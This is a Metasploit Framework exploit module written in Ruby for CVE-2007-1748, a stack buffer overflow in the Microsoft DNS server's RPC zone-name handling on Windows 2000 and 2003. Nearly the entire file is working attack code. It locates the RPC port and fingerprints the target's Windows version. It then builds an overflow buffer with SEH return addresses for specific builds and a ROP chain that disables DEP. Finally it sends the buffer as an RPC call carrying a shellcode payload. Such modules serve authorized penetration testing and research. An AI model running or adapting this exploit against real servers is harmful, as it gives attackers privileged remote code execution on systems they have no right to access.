##
# $Id: msdns_zonename.rb 4710 2007-04-19 17:43:30Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Dcerpc::Microsoft_DNS_RPC_ZoneName < Msf::Exploit::Remote

	include Exploit::Remote::DCERPC
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft DNS RPC Service extractQuotedChar() Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the RPC interface
			of the Microsoft DNS service. The vulnerability is triggered when
			a long zone name is supplied that contains escaped characters. This
			exploit will NOT work on Windows 2003 SP1 or SP2 if hardware DEP is
			enabled.
				
			},
			'Author'         => 
				[ 
					'hdm',      # initial module
					'anonymous' # 2 anonymous contributors (2003 support)
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4710 $',
			'References'     =>
				[
					['CVE', '2007-1748'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/935964.mspx']
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},			
			'Payload'        =>
				{
					'Space'    => 500,
					
					# The payload doesn't matter, but make_nops() uses these too
					'BadChars' => "\x00",
					
					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'Targets'        => 
				[
					[ 'Automatic (2000 SP0-SP4, 2003 SP0, 2003 SP1-SP2)', { } ],

					# WS2HELP.DLL
					[ 'Windows 2000 Server SP0-SP4+ English', { 'OS' => '2000', 'Off' => 1213, 'Ret' => 0x75022ac4 } ],

					# Use the __except_handler3 method
					[ 'Windows 2003 Server SP0 English', { 'OS' => '2003SP0', 'Off' => 1593, 'Rets' => [0x77f45a34, 0x41414144, 0x048f388e, 0x762108ed] } ],
	
					# ATL.DLL (bypass DEP/NX)
					[ 'Windows 2003 Server SP1-SP2 English', { 'OS' => '2003SP12', 'Off' => 1633, 'IB' => 0x76a80000 } ],
									
				],
			'DisclosureDate' => 'Apr 12 2007',
			'DefaultTarget'  => 0 ))
		
		register_options(
			[
				Opt::RPORT(0)
			], self.class)
	end
	
	def exploit


		# Ask the endpoint mapper to locate the port for us
		dport = datastore['RPORT'].to_i

		if (dport != 0 && (target.name =~ /Automatic/))
			print_status("Could not use automatic target when the remote port is given");
			return
		end

		if (dport == 0)
			
			dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp')
			
			if (not dport)
				print_status("Could not determine the RPC port used by the Microsoft DNS Server")
				return
			end
			
			print_status("Discovered Microsoft DNS Server RPC service on port #{dport}")

			if (target.name =~ /Automatic/)

				# scheduler service is only available on 2k3 SP0 and 2000
				schedport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '1ff70682-0a51-30e8-076d-740be8cee98b', '1.0', 'ncacn_ip_tcp')
				if (not schedport)
					print_status("Detected a Windows 2003 SP1-SP2 target...")
					target = targets[3]
				else
					# only available on 2003 SP0
					schedport = dcerpc_endpoint_find_tcp(datastore['RHOST'], '0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53', '1.0', 'ncacn_ip_tcp')
				
					if (not schedport)
					print_status("Detected a Windows 2000 SP0-SP4 target...")					
						target = targets[1]
					else
					print_status("Detected a Windows 2003 SP0 target...")										
						target = targets[2]
					end
				end
			else
				
			end

		end

		# Connect to the high RPC port
		connect(true, { 'RPORT' => dport })
		print_status("Trying target #{target.name}...")
		
		# Bind to the service
		handle = dcerpc_handle('50abc2a4-574d-40b3-9d66-ee4fd5fba076', '5.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		# Create our buffer with our shellcode first
		txt = Rex::Text.rand_text_alphanumeric(8192)

		if (target['OS'] =~ /2000/)
			txt[0, payload.encoded.length] = payload.encoded
		
			off = target['Off']
			txt[ off ] = [target.ret].pack('V')
			txt[ off - 4, 2] = "\xeb\x06"
			txt[ off + 4, 5] = "\xe9" + [ (off+9) * -1 ].pack('V')		

		elsif (target['OS'] =~ /2003SP0/)
			txt[0, payload.encoded.length] = payload.encoded

			off = target['Off']
			txt[ off ] = [target['Rets'][0]].pack('V')  # __except_handler3
			txt[ off - 4, 2] = "\xeb\x16"
			txt[ off + 4, 4] = [target['Rets'][1]].pack('V')  # A
			txt[ off + 8, 4] = [target['Rets'][2]].pack('V')  # B

			# addr = A + B*12 + 4 = 0x77f7e7f0  (ntdll -> 0x77f443c9)
			#
			# then mov eax, [addr] sets eax to 0x77f443c9 and the code goes here :
			#
			# 0x77f443c9 jmp off_77f7e810[edx*4]   ;  edx = 0 so jmp to 77f443d0
			# 0x77f443d0 mov eax, [ebp+arg_0]
			# 0x77f443d3 pop esi
			# 0x77f443d4 pop edi
			# 0x77f443d5 leave    ; mov esp, ebp
			# 0x77f443d6 retn     ; ret

			txt[ off + 16, 4] = [target['Rets'][3]].pack('V')  # jmp esp
			txt[ off + 20, 5] = "\xe9" + [ (off+23) * -1 ].pack('V')	

		elsif (target['OS'] =~ /2003SP12/)
			off = target['Off']
			ib  = target['IB']
			txt[ off ] = [ib + 0x2566].pack('V')


			# to bypass NX we need to emulate the call to ZwSetInformationProcess
			# with generic value (to work on SP1-SP2 + patches)

			off = 445

			# first we set esi to 0xed by getting the value on the stack
			#
			# 0x76a81da7:
			# pop esi   <- esi = edh
			# retn

			txt[ off + 4, 4 ] = [ib + 0x1da7].pack('V')
			txt[ off + 28, 4] = [0xed].pack('V')

			# now we set ecx to 0x7ffe0300, eax to 0xed
			# 0x76a81da4:
			# pop ecx    <-  ecx = 0x7ffe0300
			# mov eax, esi   <- eax == edh
			# pop esi
			# retn

			txt[ off + 32, 4] = [ib + 0x1da4].pack('V')
			txt[ off + 36, 4] = [0x7ffe0300].pack('V')

			# finally we call NtSetInformationProcess (-1, 34, 0x7ffe0270, 4)
			# 0x7FFE0270 is a pointer to 0x2 (os version info :-) to disable NX
			# 0x76a8109c:
			# call dword ptr [ecx]

			txt[ off + 44, 4] = [ib + 0x109c].pack('V')  # call dword ptr[ecx]
			txt[ off + 52, 16] = [-1, 34, 0x7FFE0270, 4].pack('VVVV')

			# we catch the second exception to go back to our shellcode, now that
			# NX is disabled

			off = 1013
			txt[ off, 4 ] = [ib + 0x135bf].pack('V')   # (jmp esp in atl.dll)
			txt[ off + 24, payload.encoded.length ] = payload.encoded

		end

		req = ''

		# Convert the string to escaped octal
		txt.unpack('C*').each do |c|
			req << "\\"
			req << c.to_s(8)
		end	

		# Build the RPC stub data
		stubdata =
			NDR.long(rand(0xffffffff)) +
			NDR.wstring(Rex::Text.rand_text_alpha(1) + "\x00\x00") +
			
			NDR.long(rand(0xffffffff)) +
			NDR.string(req + "\x00") +
			
			NDR.long(rand(0xffffffff)) +
			NDR.string(Rex::Text.rand_text_alpha(1) + "\x00")
		
		print_status('Sending exploit...')
	
		begin
			response = dcerpc.call(1, stubdata)

			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				print_status(">> " + dcerpc.last_response.stub_data.unpack("H*")[0])
			end
		rescue ::Exception => e
			print_status("Error: #{e}")
		end
		
		handler
		disconnect
	end

end
end	
